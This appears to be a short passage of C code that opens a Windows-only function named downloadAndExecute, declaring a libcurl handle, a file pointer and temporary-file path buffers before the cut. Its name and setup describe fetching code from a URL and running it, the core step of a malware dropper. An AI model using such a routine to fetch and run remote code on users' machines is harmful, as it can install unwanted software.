int downloadAndExecute(const char* url) {
#ifdef _WIN32
    CURL* curl = NULL;
    FILE* fp = NULL;
    CURLcode res = CURLE_OK;
    int result = -1; // Default to failure

    wchar_t tempPath[MAX_PATH] = {0};
    wchar_t tempFileName[MAX_PATH] = {0};
